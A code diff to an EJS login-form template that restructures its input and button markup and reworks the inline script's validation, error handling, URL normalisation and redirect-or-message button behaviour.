@@ -235,10 +235,21 @@
     <p id="login-subheader" style="color: <%= subheaderColor %>"><%= subheaderText %></p>
     <div id="input-fields">
       <% fields.forEach(field => { %>
-        <input type="<%= field.type %>" id="login-<%= field.id %>" placeholder="<%= field.placeholder %>" style="box-shadow: <%= borderShadow %>;">
+        <input 
+          type="<%= field.type %>" 
+          id="login-<%= field.id %>" 
+          placeholder="<%= field.placeholder %>" 
+          style="box-shadow: <%= borderShadow %>;"
+          <%= field.validation && field.validation.required ? 'required' : '' %>
+        >
       <% }) %>
     </div>
-    <button id="login-button" style="background: <%= buttonColor %>; color: <%= buttonTextColor %>;"><%= buttonText %></button>
+    <button 
+      id="login-button" 
+      style="background: <%= buttonColor %>; color: <%= buttonTextColor %>;"
+    >
+      <%= buttonText %>
+    </button>
   </div>
   <div class="overlay" id="message-overlay"></div>
   <div class="popup" id="message-popup" role="alertdialog" aria-labelledby="message-popup-title">
@@ -250,16 +261,7 @@
   <script>
     (function() {
       try {
-        // Parse templates safely
-        let templates;
-        try {
-          templates = JSON.parse('<%- templates %>');
-        } catch (e) {
-          console.error('Error parsing templates:', e);
-          alert('Failed to load form configuration. Please try again.');
-          return;
-        }
-
+        const templates = JSON.parse('<%- templates %>');
         const loginButton = document.getElementById('login-button');
         const messagePopup = document.getElementById('message-popup');
         const messageOverlay = document.getElementById('message-overlay');
@@ -267,17 +269,11 @@
         const messageText = document.getElementById('message-text');
         const inputFieldsContainer = document.getElementById('input-fields');
 
-        if (!loginButton || !messagePopup || !messageOverlay || !messagePopupClose || !messageText || !inputFieldsContainer) {
-          console.error('One or more DOM elements not found');
-          alert('Form initialization failed. Please refresh the page.');
-          return;
-        }
-
         function normalizeUrl(url) {
           if (!url) return null;
           url = url.trim();
-          if (url.match(/^https?:\\/\\//)) return url;
-          if (url.match(/\\.[a-z]{2,}$/i)) return 'https://' + url;
+          if (url.match(/^https?:\/\//)) return url;
+          if (url.match(/\.[a-z]{2,}$/i)) return 'https://' + url;
           return null;
         }
 
@@ -294,7 +290,7 @@
 
         function checkFormFilled() {
           const inputs = inputFieldsContainer.querySelectorAll('input');
-          const templateFields = templates['<%= template %>']?.fields || [];
+          const templateFields = templates['<%= template %>'].fields;
 
           for (let i = 0; i < inputs.length; i++) {
             const input = inputs[i];
@@ -302,20 +298,22 @@
             const fieldId = input.id.replace('login-', '');
             const templateField = templateFields.find(field => field.id === fieldId);
 
-            if (!value && (!templateField || templateField.validation.required)) {
+            if (!value && templateField?.validation?.required) {
               showMessagePopup('Please fill all required fields before proceeding.');
               return false;
             }
 
-            if (templateField && templateField.validation && templateField.validation.regex) {
+            if (templateField?.validation?.regex) {
               try {
                 const regex = new RegExp(templateField.validation.regex);
                 if (!regex.test(value)) {
-                  showMessagePopup(templateField.validation.errorMessage);
+                  showMessagePopup(templateField.validation.errorMessage || 'Invalid input.');
                   return false;
                 }
               } catch (e) {
                 console.error('Invalid regex for field:', fieldId, e);
+                showMessagePopup('Validation error occurred.');
+                return false;
               }
             }
           }
@@ -354,35 +352,42 @@
         }
 
         loginButton.addEventListener('click', async () => {
-          if (!checkFormFilled()) return;
-          const submitted = await submitFormData();
-          if (!submitted) return;
+          try {
+            if (!checkFormFilled()) return;
+            const submitted = await submitFormData();
+            if (!submitted) return;
 
-          const action = '<%= buttonAction %>';
-          const url = '<%= buttonUrl %>';
-          const message = '<%= buttonMessage %>';
-          console.log('Button clicked:', { action, url, message });
-          if (action === 'url') {
-            const normalizedUrl = normalizeUrl(url);
-            if (normalizedUrl) {
-              console.log('Redirecting to:', normalizedUrl);
-              window.location.href = normalizedUrl;
+            const action = '<%= buttonAction %>';
+            const url = '<%= buttonUrl %>';
+            const message = '<%= buttonMessage %>';
+            console.log('Button clicked:', { action, url, message });
+
+            if (action === 'url') {
+              const normalizedUrl = normalizeUrl(url);
+              if (normalizedUrl) {
+                console.log('Redirecting to:', normalizedUrl);
+                window.location.href = normalizedUrl;
+              } else {
+                showMessagePopup('Please enter a valid URL (e.g., www.example.com).');
+              }
+            } else if (action === 'message') {
+              showMessagePopup(message || 'Form submitted successfully!');
             } else {
-              showMessagePopup('Please enter a valid URL (e.g., www.example.com).');
+              console.error('Invalid button action:', action);
+              showMessagePopup('Error: Invalid button configuration.');
             }
-          } else if (action === 'message') {
-            showMessagePopup(message);
-          } else {
-            console.error('Invalid button action:', action);
-            showMessagePopup('Error: Invalid button configuration.');
+          } catch (error) {
+            console.error('Error in button click handler:', error);
+            showMessagePopup('An error occurred. Please try again.');
           }
         });
 
         messagePopupClose.addEventListener('click', hideMessagePopup);
         messageOverlay.addEventListener('click', hideMessagePopup);
+
       } catch (error) {
         console.error('Error in form script:', error);
-        alert('An error occurred. Please try again.');
+        showMessagePopup('An error occurred. Please try again.');
       }
     })();
   </script>
